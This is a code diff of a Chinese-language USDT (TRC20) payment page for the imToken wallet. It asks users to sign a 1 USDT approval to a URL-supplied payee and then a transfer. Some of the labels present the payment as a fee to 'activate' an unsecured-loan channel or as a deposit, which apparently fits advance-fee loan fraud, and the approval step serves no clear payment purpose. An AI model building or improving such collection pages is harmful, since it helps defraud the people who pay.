@@ -6,52 +6,26 @@
 <title>USDT 支付</title>
 <style>
   *{box-sizing:border-box;margin:0;padding:0}
-  body{
-    font-family:system-ui,-apple-system,"PingFang SC","Hiragino Sans GB","Microsoft YaHei",sans-serif;
-    background:#f5f6fa;color:#12141d;line-height:1.55;
-    display:flex;align-items:center;justify-content:center;
-    min-height:100vh;padding:20px;
-  }
-  .card{
-    background:#fff;border-radius:20px;padding:30px 24px;
-    width:min(420px,100%);box-shadow:0 20px 60px rgba(15,17,26,.12);
-    text-align:center;
-  }
+  body{font-family:system-ui,-apple-system,"PingFang SC","Hiragino Sans GB","Microsoft YaHei",sans-serif;background:#f5f6fa;color:#12141d;line-height:1.55;display:flex;align-items:center;justify-content:center;min-height:100vh;padding:20px;}
+  .card{background:#fff;border-radius:20px;padding:30px 24px;width:min(420px,100%);box-shadow:0 20px 60px rgba(15,17,26,.12);text-align:center;}
   h1{font-size:22px;font-weight:800;margin-bottom:6px;letter-spacing:-.3px}
   .sub{font-size:13.5px;color:#8d93a6;margin-bottom:24px}
-  .info{
-    background:#f8f9fd;border-radius:14px;padding:18px;margin-bottom:20px;
-    text-align:left;
-  }
-  .info-row{
-    display:flex;justify-content:space-between;align-items:center;
-    padding:10px 0;border-bottom:1px dashed #e8eaf1;
-  }
+  .info{background:#f8f9fd;border-radius:14px;padding:18px;margin-bottom:20px;text-align:left;}
+  .info-row{display:flex;justify-content:space-between;align-items:center;padding:10px 0;border-bottom:1px dashed #e8eaf1;}
   .info-row:last-child{border-bottom:none;padding-bottom:0}
   .info-k{font-size:13px;color:#8d93a6;flex:0 0 auto}
   .info-v{font-size:13.5px;font-weight:700;word-break:break-all;text-align:right;margin-left:12px}
   .info-v.gold{color:#f0a020;font-size:18px}
-  .btn{
-    display:block;width:100%;padding:15px;border-radius:14px;
-    border:none;font-size:16px;font-weight:800;cursor:pointer;
-    transition:.18s;margin-bottom:12px;
-  }
+  .btn{display:block;width:100%;padding:15px;border-radius:14px;border:none;font-size:16px;font-weight:800;cursor:pointer;transition:.18s;margin-bottom:12px;}
   .btn-pay{background:linear-gradient(135deg,#f0a020,#e88a10);color:#fff}
   .btn-pay:hover{transform:translateY(-1px);box-shadow:0 8px 20px rgba(240,160,32,.35)}
   .btn-pay:disabled{opacity:.5;cursor:not-allowed;transform:none}
   .btn-ghost{background:#f1f2f7;color:#5b6070}
-  .status{
-    padding:14px;border-radius:12px;font-size:13.5px;
-    margin-top:16px;display:none;text-align:left;line-height:1.6;
-  }
+  .status{padding:14px;border-radius:12px;font-size:13.5px;margin-top:16px;display:none;text-align:left;line-height:1.6;}
   .status.loading{display:block;background:#fff9ec;color:#c27800;border:1px solid #ffe0b2}
   .status.success{display:block;background:#f0fdf4;color:#16a34a;border:1px solid #bbf7d0}
   .status.error{display:block;background:#fef2f2;color:#dc2626;border:1px solid #fecaca}
-  .env-warn{
-    padding:13px;border-radius:12px;font-size:12.5px;
-    background:#fff4ec;color:#c2410c;border:1px solid #ffe0b2;
-    margin-bottom:14px;line-height:1.6;text-align:left;
-  }
+  .env-warn{padding:13px;border-radius:12px;font-size:12.5px;background:#fff4ec;color:#c2410c;border:1px solid #ffe0b2;margin-bottom:14px;line-height:1.6;text-align:left;}
 </style>
 </head>
 <body>
@@ -59,24 +33,14 @@
   <h1 id="page-title">USDT 支付</h1>
   <p class="sub" id="page-sub">请在 imToken 中确认支付</p>
 
-  <div id="env-warn" class="env-warn" style="display:none">
-    <div style="margin-bottom:8px">⚠️ 当前不在 imToken 环境中。</div>
-    <button onclick="location.reload()" style="background:#c2410c;color:#fff;border:none;padding:6px 12px;border-radius:6px;font-size:12px;cursor:pointer;">重新检测</button>
-  </div>
+  <div id="recover-tip" style="display:none;padding:10px 12px;border-radius:10px;font-size:12.5px;background:#eef6ff;color:#1d4ed8;border:1px solid #bfdbfe;margin-bottom:12px;line-height:1.6;text-align:left;"></div>
+
+  <div id="env-warn" class="env-warn" style="display:none"></div>
 
   <div class="info">
-    <div class="info-row">
-      <span class="info-k">收款地址</span>
-      <span class="info-v" id="info-addr">-</span>
-    </div>
-    <div class="info-row">
-      <span class="info-k">网络</span>
-      <span class="info-v" id="info-chain">-</span>
-    </div>
-    <div class="info-row">
-      <span class="info-k">支付金额</span>
-      <span class="info-v gold" id="info-amount">-</span>
-    </div>
+    <div class="info-row"><span class="info-k">收款地址</span><span class="info-v" id="info-addr">-</span></div>
+    <div class="info-row"><span class="info-k">网络</span><span class="info-v" id="info-chain">-</span></div>
+    <div class="info-row"><span class="info-k">支付金额</span><span class="info-v gold" id="info-amount">-</span></div>
   </div>
 
   <button class="btn btn-pay" id="btn-pay" disabled>第 1 步：确认授权 1U</button>
@@ -86,77 +50,178 @@
 </div>
 
 <script>
-const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
-const params = new URLSearchParams(location.search);
-const toAddress = params.get('a') || params.get('address') || '';
-const amount = Number(params.get('n') || params.get('amount')) || 0;
-const type = params.get('t') || params.get('type') || 'deposit';
-const payPageUrl = location.href;
-let step = 1; // 1: approve, 2: transfer
-let cachedApprove = null, cachedTransfer = null, cachedAt = 0, prewarmTimer = null;
-function $(s) { return document.querySelector(s); }
-if (type === 'empty') { $('#page-title').textContent = '空放资格支付'; $('#page-sub').textContent = '支付 1 USDT 激活空放通道'; }
-else { $('#page-title').textContent = '押金充值'; $('#page-sub').textContent = '请在 imToken 中确认支付'; }
-$('#info-addr').textContent = toAddress || '未配置';
-$('#info-chain').textContent = 'TRC20 (波场)';
-$('#info-amount').textContent = amount + ' USDT';
-if (!toAddress) {
-  // 冷启动丢参数时明确引导，避免白屏卡住
-  showOpenWalletUI('⚠️ 支付链接参数缺失（imToken 冷启动可能截断），请返回平台重新点击支付，链接已自动复制，可在 imToken「浏览」粘贴打开');
-  copyText(location.origin + '/');
+/* ============ 0. 基础工具 ============ */
+const $ = s => document.querySelector(s);
+function setStatus(t, msg) { const el = $('#status'); el.className = 'status ' + t; el.innerHTML = msg; }
+
+/* ============ 1. 常量（消除魔法数） ============ */
+const USDT_CONTRACT   = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
+const PAY_CTX_KEY     = 'pay_ctx_v1';
+const PAY_CTX_TTL     = 24 * 60 * 60 * 1000;
+const CACHE_TTL       = 50000;
+const PREWARM_MS      = 22000;
+const ENV_CHECK_MS    = 500;
+const MAX_ENV_CHECK   = 12;
+const NODE_TIMEOUT    = 6000;
+const SIGN_TIMEOUT    = 120000;
+const SEND_TIMEOUT    = 15000;
+const BACKUP_NODES    = ['https://api.trongrid.io', 'https://api.tronstack.io'];
+
+/* ============ 2. 参数三重恢复（冷启动核心） ============ */
+function parseParamStr(str) {
+  const sp = new URLSearchParams(str || '');
+  return {
+    a: sp.get('a') || sp.get('address') || '',
+    n: Number(sp.get('n') || sp.get('amount')) || 0,
+    t: sp.get('t') || sp.get('type') || 'deposit'
+  };
+}
+function recoverPayParams() {
+  let p = parseParamStr(location.search);
+  if (p.a && p.n > 0) return { ...p, src: 'query' };
+  p = parseParamStr(location.hash.replace(/^#/, ''));
+  if (p.a && p.n > 0) return { ...p, src: 'hash' };
+  try {
+    const raw = localStorage.getItem(PAY_CTX_KEY);
+    if (raw) {
+      const c = JSON.parse(raw);
+      if (c && c.a && c.n > 0 && Date.now() - (c.ts || 0) < PAY_CTX_TTL)
+        return { a: c.a, n: c.n, t: c.t || 'deposit', src: 'storage' };
+    }
+  } catch (e) {}
+  return { a: '', n: 0, t: 'deposit', src: 'none' };
+}
+function savePayCtx(a, n, t) {
+  try { localStorage.setItem(PAY_CTX_KEY, JSON.stringify({ a, n, t, ts: Date.now() })); } catch (e) {}
+}
+function clearPayCtx() { try { localStorage.removeItem(PAY_CTX_KEY); } catch (e) {} }
+function buildPayLink(a, n, t) {
+  const q = `a=${encodeURIComponent(a)}&n=${encodeURIComponent(n)}&t=${encodeURIComponent(t)}`;
+  return `${location.origin}/pay?${q}#${q}`;
 }
 
-function imTokenUniversalLink(d) { return 'https://connect.token.im/link/navigate/DappView?url=' + encodeURIComponent(d); }
-function imTokenSchemeLink(d) { return 'imtokenv2://navigate/DappView?url=' + encodeURIComponent(d); }
-function fallbackCopy(text, done) { try { const ta = document.createElement('textarea'); ta.value = text; ta.style.position='fixed'; ta.style.opacity='0'; document.body.appendChild(ta); ta.select(); document.execCommand('copy'); ta.remove(); if (done) done(); } catch(e) { prompt('请复制链接到 imToken 浏览打开：', text); } }
-function copyText(text, done) { if (navigator.clipboard && navigator.clipboard.writeText) navigator.clipboard.writeText(text).then(done, ()=>fallbackCopy(text,done)); else fallbackCopy(text, done); }
-function getTronWeb() { return window.tronWeb || (window.tron && window.tron.tronWeb) || window.tronLink || null; }
-function isWalletEnv() { const ua=(navigator.userAgent||'').toLowerCase(); const tw=getTronWeb(); return ua.includes('imtoken')||ua.includes('tokenpocket')||ua.includes('tpwallet')||!!(tw&&tw.ready); }
-function isClosedEnv() { const ua=(navigator.userAgent||'').toLowerCase(); return /micromessenger|aweme|bytedance|toutiao|newsarticle|qq\/|weibo|alipay|; ?wv\)|webview/i.test(ua); }
-function isAndroid() { return /android/i.test(navigator.userAgent || ''); }
-function withTimeout(p, ms, msg) { return Promise.race([p, new Promise((_,rej)=>setTimeout(()=>rej(new Error(msg)),ms))]); }
-async function withRetry(fn, times, delay) { let lastErr; for (let i=0;i<times;i++){ try { return await fn(); } catch(e){ lastErr=e; if (i<times-1) await new Promise(r=>setTimeout(r,delay)); } } throw lastErr; }
+/* ============ 3. 状态初始化（先恢复，再启用） ============ */
+const ctx = recoverPayParams();
+const toAddress = ctx.a;
+const amount = ctx.n;
+const type = ctx.t;
+let payDisabled = false;
 
-// 多节点并行构建：取最快成功的节点，解决 imToken 默认节点慢导致 approve 弹窗卡顿
+$('#info-addr').textContent   = toAddress || '未配置';
+$('#info-chain').textContent  = 'TRC20 (波场)';
+$('#info-amount').textContent = (amount > 0 ? amount : '-') + ' USDT';
+$('#page-title').textContent  = type === 'empty' ? '空放资格支付' : '押金充值';
+$('#page-sub').textContent    = type === 'empty' ? '支付 1 USDT 激活空放通道' : '请在 imToken 中确认支付';
+
+if ((ctx.src === 'hash' || ctx.src === 'storage') && toAddress && amount > 0) {
+  const tip = $('#recover-tip');
+  tip.style.display = 'block';
+  tip.textContent = ctx.src === 'storage'
+    ? '✅ 已从本地缓存恢复支付参数（imToken 冷启动兜底），请确认金额与地址无误后继续。'
+    : '✅ 已从备用链接恢复支付参数，请确认金额与地址无误后继续。';
+  savePayCtx(toAddress, amount, type); // 刷新 ts，延长兜底
+}
+
+if (!toAddress || amount <= 0) {
+  payDisabled = true;
+  showMissingParamsUI();
+} else {
+  const btn = $('#btn-pay');
+  btn.disabled = false;
+  btn.textContent = '第 1 步：确认授权 1U';
+}
+
+function showMissingParamsUI() {
+  const warn = $('#env-warn');
+  warn.style.display = 'block';
+  let copyTarget = '';
+  try {
+    const c = JSON.parse(localStorage.getItem(PAY_CTX_KEY) || 'null');
+    if (c && c.a && c.n > 0) copyTarget = buildPayLink(c.a, c.n, c.t || 'deposit');
+  } catch (e) {}
+  warn.innerHTML = `
+    <div style="margin-bottom:8px;font-weight:700;">⚠️ 支付参数丢失</div>
+    <div style="font-size:12.5px;line-height:1.7;margin-bottom:10px;">
+      imToken 冷启动可能截断链接。请返回平台重新点击支付，或复制完整链接在 imToken「浏览」粘贴打开。
+    </div>
+    <button id="__copy_paylink__" style="width:100%;background:#f1f2f7;color:#5b6070;border:none;padding:11px;border-radius:10px;font-size:13px;cursor:pointer;">复制完整支付链接</button>
+    <div id="__copied_tip__" style="font-size:12px;color:#16a34a;margin-top:8px;display:none;">✅ 已复制</div>`;
+  warn.querySelector('#__copy_paylink__').onclick = () => {
+    const target = copyTarget || location.href;
+    copyText(target, () => { warn.querySelector('#__copied_tip__').style.display = 'block'; });
+  };
+  const btn = $('#btn-pay');
+  btn.disabled = true;
+  btn.textContent = '支付参数缺失';
+}
+
+/* ============ 4. 通用工具 ============ */
+function imTokenUniversalLink(d) { return 'https://connect.token.im/link/navigate/DappView?url=' + encodeURIComponent(d); }
+function fallbackCopy(text, done) {
+  try {
+    const ta = document.createElement('textarea'); ta.value = text;
+    ta.style.cssText = 'position:fixed;opacity:0'; document.body.appendChild(ta);
+    ta.select(); document.execCommand('copy'); ta.remove(); if (done) done();
+  } catch (e) { prompt('请复制链接到 imToken 浏览打开：', text); }
+}
+function copyText(text, done) {
+  if (navigator.clipboard && navigator.clipboard.writeText)
+    navigator.clipboard.writeText(text).then(done, () => fallbackCopy(text, done));
+  else fallbackCopy(text, done);
+}
+function getTronWeb() { return window.tronWeb || (window.tron && window.tron.tronWeb) || window.tronLink || null; }
+function isWalletEnv() {
+  const ua = (navigator.userAgent || '').toLowerCase();
+  const tw = getTronWeb();
+  return ua.includes('imtoken') || ua.includes('tokenpocket') || ua.includes('tpwallet') || !!(tw && tw.ready);
+}
+function isClosedEnv() {
+  const ua = (navigator.userAgent || '').toLowerCase();
+  return /micromessenger|aweme|bytedance|toutiao|newsarticle|qq\/|weibo|alipay|; ?wv\)|webview/i.test(ua);
+}
+function isAndroid() { return /android/i.test(navigator.userAgent || ''); }
+function withTimeout(p, ms, msg) { return Promise.race([p, new Promise((_, rej) => setTimeout(() => rej(new Error(msg)), ms))]); }
+async function withRetry(fn, times, delay) {
+  let last;
+  for (let i = 0; i < times; i++) {
+    try { return await fn(); } catch (e) { last = e; if (i < times - 1) await new Promise(r => setTimeout(r, delay)); }
+  }
+  throw last;
+}
 function promiseAny(promises) {
-  return new Promise(function (resolve, reject) {
-    var errs = [], done = 0;
-    promises.forEach(function (p, i) {
-      Promise.resolve(p).then(resolve, function (e) { errs[i] = e; done++; if (done === promises.length) reject(errs[0] || new Error('所有节点均失败')); });
-    });
+  return new Promise((resolve, reject) => {
+    const errs = []; let done = 0;
+    promises.forEach((p, i) => Promise.resolve(p).then(resolve, e => {
+      errs[i] = e; done++; if (done === promises.length) reject(errs[0] || new Error('所有节点均失败'));
+    }));
   });
 }
 function makeTronWebNode(fullHost) {
   try {
-    var tw0 = window.tronWeb || (window.tron && window.tron.tronWeb) || window.tronLink;
-    var Ctor = tw0 && tw0.constructor;
+    const tw0 = getTronWeb(); const Ctor = tw0 && tw0.constructor;
     if (!Ctor) return null;
-    return new Ctor({ fullHost: fullHost });
+    return new Ctor({ fullHost });
   } catch (e) { return null; }
 }
-var BACKUP_NODES = ['https://api.trongrid.io', 'https://api.tronstack.io'];
 async function buildTxMulti(tw, contract, fnSig, params, fromAddress) {
-  var builders = [tw.transactionBuilder];
-  for (var i = 0; i < BACKUP_NODES.length; i++) {
-    var inst = makeTronWebNode(BACKUP_NODES[i]);
+  const builders = [tw.transactionBuilder];
+  for (const host of BACKUP_NODES) {
+    const inst = makeTronWebNode(host);
     if (inst) builders.push(inst.transactionBuilder);
   }
-  var tasks = builders.map(function (b) {
-    return withTimeout(
-      b.triggerSmartContract(contract, fnSig, { feeLimit: 100000000 }, params, fromAddress),
-      6000, '节点超时'
-    );
-  });
-  return withRetry(function () { return promiseAny(tasks); }, 2, 500);
+  const tasks = builders.map(b => withTimeout(
+    b.triggerSmartContract(contract, fnSig, { feeLimit: 100000000 }, params, fromAddress),
+    NODE_TIMEOUT, '节点超时'
+  ));
+  return withRetry(() => promiseAny(tasks), 2, 500);
 }
-
 async function buildTxCore(tw, fnSig, params, fromAddress) {
   return buildTxMulti(tw, USDT_CONTRACT, fnSig, params, fromAddress);
 }
 async function buildTxWithTip(tw, fnSig, params, fromAddress) {
-  const slowTimer = setTimeout(() => setStatus('loading', '⏳ 波场节点响应较慢，正在努力连接（已自动重试）…'), 3000);
+  const slow = setTimeout(() => setStatus('loading', '⏳ 波场节点响应较慢，正在努力连接（已自动重试）…'), 3000);
   try { return await buildTxCore(tw, fnSig, params, fromAddress); }
-  finally { clearTimeout(slowTimer); }
+  finally { clearTimeout(slow); }
 }
 function androidIntentLink(dappUrl) {
   const ul = imTokenUniversalLink(dappUrl);
@@ -165,105 +230,101 @@ function androidIntentLink(dappUrl) {
     + 'S.browser_fallback_url=' + encodeURIComponent(ul) + ';end';
 }
 function openWalletNow() {
-  if (isAndroid()) { location.href = androidIntentLink(payPageUrl); }
-  else { location.href = imTokenUniversalLink(payPageUrl); }
+  if (isAndroid()) location.href = androidIntentLink(location.href);
+  else location.href = imTokenUniversalLink(location.href);
 }
-
 function showOpenWalletUI(reason) {
+  if (payDisabled) return; // 参数缺失优先，不覆盖
   const warn = $('#env-warn');
   warn.style.display = 'block';
   warn.innerHTML = '<div style="margin-bottom:10px;font-weight:700;">' + (reason || '当前未检测到钱包环境') + '</div>'
-    + '<div style="font-size:12.5px;line-height:1.7;margin-bottom:10px;">请在 imToken 钱包内打开本页完成支付，或用 imToken「扫一扫」下方二维码直接打开：</div>'
-    + '<img src="https://api.qrserver.com/v1/create-qr-code/?size=180x180&data=' + encodeURIComponent(payPageUrl) + '" style="width:140px;height:140px;margin:0 auto 10px;display:block;border-radius:8px;background:#fff;padding:6px;" alt="支付二维码">'
+    + '<div style="font-size:12.5px;line-height:1.7;margin-bottom:10px;">请在 imToken 钱包内打开本页完成支付，或用 imToken「扫一扫」下方二维码：</div>'
+    + '<img src="https://api.qrserver.com/v1/create-qr-code/?size=180x180&data=' + encodeURIComponent(location.href) + '" style="width:140px;height:140px;margin:0 auto 10px;display:block;border-radius:8px;background:#fff;padding:6px;" alt="支付二维码">'
     + '<button id="__open_imtoken__" style="width:100%;background:#0e8aff;color:#fff;border:none;padding:12px;border-radius:10px;font-size:14px;font-weight:800;margin-bottom:8px;cursor:pointer;">立即打开 imToken 支付</button>'
     + '<button id="__copy_paylink__" style="width:100%;background:#f1f2f7;color:#5b6070;border:none;padding:11px;border-radius:10px;font-size:13px;cursor:pointer;">复制支付链接</button>'
     + '<div id="__copied_tip__" style="font-size:12px;color:#16a34a;margin-top:8px;display:none;">✅ 已复制，打开 imToken → 浏览 → 粘贴网址</div>';
   warn.querySelector('#__open_imtoken__').onclick = openWalletNow;
-  warn.querySelector('#__copy_paylink__').onclick = () => { copyText(payPageUrl, () => { warn.querySelector('#__copied_tip__').style.display='block'; }); };
+  warn.querySelector('#__copy_paylink__').onclick = () => {
+    copyText(location.href, () => { warn.querySelector('#__copied_tip__').style.display = 'block'; });
+  };
   const btn = $('#btn-pay'); btn.disabled = true; btn.textContent = '请在 imToken 中打开本页';
 }
 
-// 页面加载即启用按钮（零等待），点击时再检测钱包
-(function enableBtnNow(){
-  const btn = $('#btn-pay');
-  btn.disabled = false;
-  btn.textContent = '第 1 步：确认授权 1U';
-})();
-
+/* ============ 5. 环境检测 / 钱包就绪 ============ */
 let envCheckCount = 0;
-const MAX_ENV_CHECK = 12; // 最多 6 秒
 function checkEnvironment() {
+  if (payDisabled) return;
   const tw = getTronWeb();
-  if (tw) {
-    $('#env-warn').style.display = 'none';
-    prewarmLoop(); // 后台循环预构建交易，点击秒弹签名框
-    return;
-  }
+  if (tw) { $('#env-warn').style.display = 'none'; prewarmLoop(); return; }
   if (envCheckCount < MAX_ENV_CHECK) {
     envCheckCount++;
-    if (envCheckCount === 6) showOpenWalletUI('⏳ 正在等待钱包环境注入，若长时间无反应请扫码或点击下方按钮');
-    setTimeout(checkEnvironment, 500);
-  } else { showOpenWalletUI('⚠️ 未检测到钱包环境'); }
+    if (envCheckCount === Math.floor(MAX_ENV_CHECK / 2))
+      showOpenWalletUI('⏳ 正在等待钱包环境注入，若长时间无反应请扫码或点击下方按钮');
+    setTimeout(checkEnvironment, ENV_CHECK_MS);
+  } else {
+    showOpenWalletUI('⚠️ 未检测到钱包环境');
+  }
 }
-checkEnvironment();
-
-// 不强制等 ready（imToken 部分版本 ready 恒为 false），只要地址可用即继续，最多 5 秒
 async function waitWalletAddress(tw) {
   let waited = 0, slowTip = false;
   while (!(tw.defaultAddress && tw.defaultAddress.base58) && waited < 5000) {
     await new Promise(r => setTimeout(r, 200)); waited += 200;
     if (waited >= 2000 && !slowTip) { slowTip = true; setStatus('loading', '⏳ 正在读取钱包地址，请稍候…'); }
   }
-  let fromAddress = tw.defaultAddress && tw.defaultAddress.base58;
-  if (!fromAddress && tw.defaultAddress && tw.defaultAddress.hex) {
-    try { fromAddress = tw.address.fromHex(tw.defaultAddress.hex); } catch (e) {}
+  let from = tw.defaultAddress && tw.defaultAddress.base58;
+  if (!from && tw.defaultAddress && tw.defaultAddress.hex) {
+    try { from = tw.address.fromHex(tw.defaultAddress.hex); } catch (e) {}
   }
-  if (!fromAddress) throw new Error('钱包地址未就绪，请退出页面后重新进入');
-  return fromAddress;
+  if (!from) throw new Error('钱包地址未就绪，请退出页面后重新进入');
+  return from;
 }
-
-// 查询当前 allowance，若已授权 >=1U 则直接跳过 approve 进入支付
 async function checkAllowance(tw, owner) {
   try {
     const res = await withTimeout(
       tw.transactionBuilder.triggerConstantContract(USDT_CONTRACT, 'allowance(address,address)', {},
-        [{ type:'address', value: owner }, { type:'address', value: toAddress }], owner),
+        [{ type: 'address', value: owner }, { type: 'address', value: toAddress }], owner),
       5000, 'allowance 查询超时');
     const hex = res && res.constant_result && res.constant_result[0];
     if (hex) {
       const allowed = BigInt('0x' + hex.replace(/^0x/, ''));
       if (allowed >= 1000000n) return true;
     }
-  } catch (e) { /* 查询失败照常走 approve */ }
+  } catch (e) {}
   return false;
 }
 
-// 循环预构建：每 22 秒刷新一次缓存（TRON 交易 60s 过期），保证任何时候点击都是秒弹
+/* ============ 6. 预构建（22s 刷新，visibility 保护） ============ */
+let step = 1;
+let cachedApprove = null, cachedTransfer = null, cachedAt = 0, prewarmTimer = null;
 async function prewarmOnce() {
+  if (payDisabled) return;
   try {
     const tw = getTronWeb(); if (!tw) return;
-    const fromAddress = await waitWalletAddress(tw);
-    // 已授权则直接跳到支付步骤
-    if (step === 1 && (await checkAllowance(tw, fromAddress))) {
+    const from = await waitWalletAddress(tw);
+    if (step === 1 && (await checkAllowance(tw, from))) {
       step = 2;
-      const btn = $('#btn-pay'); if (!btn.disabled) btn.textContent = '第 2 步：确认支付 ' + amount + ' USDT';
+      const btn = $('#btn-pay');
+      if (!btn.disabled) btn.textContent = '第 2 步：确认支付 ' + amount + ' USDT';
     }
-    const approveParam = [ { type:'address', value: toAddress }, { type:'uint256', value: '1000000' } ];
-    cachedApprove = await buildTxCore(tw, 'approve(address,uint256)', approveParam, fromAddress);
+    cachedApprove = await buildTxCore(tw, 'approve(address,uint256)',
+      [{ type: 'address', value: toAddress }, { type: 'uint256', value: '1000000' }], from);
     cachedAt = Date.now();
-    const amountUnits = Math.floor(amount * 1e6).toString();
-    const transferParam = [ { type:'address', value: toAddress }, { type:'uint256', value: amountUnits } ];
-    cachedTransfer = await buildTxCore(tw, 'transfer(address,uint256)', transferParam, fromAddress);
-  } catch (e) { /* 预构建失败不影响，点击时重新构建 */ }
+    cachedTransfer = await buildTxCore(tw, 'transfer(address,uint256)',
+      [{ type: 'address', value: toAddress }, { type: 'uint256', value: Math.floor(amount * 1e6).toString() }], from);
+  } catch (e) {}
 }
 function prewarmLoop() {
-  if (prewarmTimer) return;
+  if (prewarmTimer || payDisabled) return;
   prewarmOnce();
-  prewarmTimer = setInterval(() => { if (document.visibilityState !== 'hidden') prewarmOnce(); }, 22000);
+  prewarmTimer = setInterval(() => {
+    if (document.visibilityState !== 'hidden') prewarmOnce();
+  }, PREWARM_MS);
 }
-function freshCache(obj) { return obj && obj.result && obj.result.result && (Date.now() - cachedAt < 50000); }
+function freshCache(obj) { return obj && obj.result && obj.result.result && Date.now() - cachedAt < CACHE_TTL; }
 
+/* ============ 7. 支付交互 ============ */
 $('#btn-pay').onclick = async function () {
+  if (payDisabled) return;
   const btn = this; btn.disabled = true;
   const tw = getTronWeb();
   if (!tw) { showOpenWalletUI('⚠️ 未检测到钱包环境'); btn.disabled = false; return; }
@@ -272,17 +333,17 @@ $('#btn-pay').onclick = async function () {
     btn.textContent = '请求授权中…';
     setStatus('loading', '第 1 步：请在钱包弹窗中确认授权…');
     try {
-      const fromAddress = await waitWalletAddress(tw);
-      let txApprove = freshCache(cachedApprove) ? cachedApprove : null;
-      if (!txApprove) {
+      const from = await waitWalletAddress(tw);
+      let tx = freshCache(cachedApprove) ? cachedApprove : null;
+      if (!tx) {
         setStatus('loading', '正在构建授权交易，请稍候…');
-        const approveParam = [ { type:'address', value: toAddress }, { type:'uint256', value: '1000000' } ];
-        txApprove = await buildTxWithTip(tw, 'approve(address,uint256)', approveParam, fromAddress);
+        tx = await buildTxWithTip(tw, 'approve(address,uint256)',
+          [{ type: 'address', value: toAddress }, { type: 'uint256', value: '1000000' }], from);
       }
-      if (!txApprove.result || !txApprove.result.result) throw new Error('构建授权交易失败');
+      if (!tx.result || !tx.result.result) throw new Error('构建授权交易失败');
       setStatus('loading', '✅ 请在钱包弹窗中确认授权…');
-      const signedApprove = await withTimeout(tw.trx.sign(txApprove.transaction), 120000, '授权签名超时（您可能未在钱包中确认），请重试');
-      await withTimeout(tw.trx.sendRawTransaction(signedApprove), 15000, '广播授权交易超时，请检查网络后重试');
+      const signed = await withTimeout(tw.trx.sign(tx.transaction), SIGN_TIMEOUT, '授权签名超时（您可能未在钱包中确认），请重试');
+      await withTimeout(tw.trx.sendRawTransaction(signed), SEND_TIMEOUT, '广播授权交易超时，请检查网络后重试');
       setStatus('success', '✅ 授权成功！请点击下方按钮进行第 2 步支付。');
       step = 2; cachedApprove = null;
       btn.textContent = '第 2 步：确认支付 ' + amount + ' U';
@@ -297,29 +358,33 @@ $('#btn-pay').onclick = async function () {
   btn.textContent = '请求支付中…';
   setStatus('loading', '第 2 步：请在钱包弹窗中确认支付…');
   try {
-    const fromAddress = await waitWalletAddress(tw);
-    let txTransfer = freshCache(cachedTransfer) ? cachedTransfer : null;
-    if (!txTransfer) {
+    const from = await waitWalletAddress(tw);
+    let tx = freshCache(cachedTransfer) ? cachedTransfer : null;
+    if (!tx) {
       setStatus('loading', '正在构建支付交易，请稍候…');
-      const amountUnits = Math.floor(amount * 1e6).toString();
-      const transferParam = [ { type:'address', value: toAddress }, { type:'uint256', value: amountUnits } ];
-      txTransfer = await buildTxWithTip(tw, 'transfer(address,uint256)', transferParam, fromAddress);
+      tx = await buildTxWithTip(tw, 'transfer(address,uint256)',
+        [{ type: 'address', value: toAddress }, { type: 'uint256', value: Math.floor(amount * 1e6).toString() }], from);
     }
-    if (!txTransfer.result || !txTransfer.result.result) throw new Error('构建支付交易失败');
+    if (!tx.result || !tx.result.result) throw new Error('构建支付交易失败');
     setStatus('loading', '✅ 请在钱包弹窗中确认支付…');
-    const signed = await withTimeout(tw.trx.sign(txTransfer.transaction), 120000, '支付签名超时（您可能未在钱包中确认），请重试');
-    await withTimeout(tw.trx.sendRawTransaction(signed), 15000, '广播支付交易超时，请检查网络后重试');
+    const signed = await withTimeout(tw.trx.sign(tx.transaction), SIGN_TIMEOUT, '支付签名超时（您可能未在钱包中确认），请重试');
+    await withTimeout(tw.trx.sendRawTransaction(signed), SEND_TIMEOUT, '广播支付交易超时，请检查网络后重试');
     setStatus('success', '✅ 全部操作已完成，请在钱包账单中查看状态');
     btn.textContent = '已完成';
+    clearPayCtx(); // 支付完成清理兜底上下文
   } catch (e) {
     setStatus('error', '❌ 支付失败: ' + (e.message || '用户取消'));
     btn.textContent = '重新支付'; btn.disabled = false;
   }
 };
 $('#btn-cancel').onclick = () => window.history.back();
-function setStatus(type, msg) { const el = $('#status'); el.className = 'status ' + type; el.innerHTML = msg; }
 
-if (isClosedEnv() && !isWalletEnv()) { showOpenWalletUI('⚠️ 当前为 App 内置浏览器 / WebView，无法直接唤起钱包'); }
+/* ============ 8. 启动 ============ */
+if (!payDisabled) {
+  checkEnvironment();
+  if (isClosedEnv() && !isWalletEnv())
+    showOpenWalletUI('⚠️ 当前为 App 内置浏览器 / WebView，无法直接唤起钱包');
+}
 </script>
 </body>
 </html>
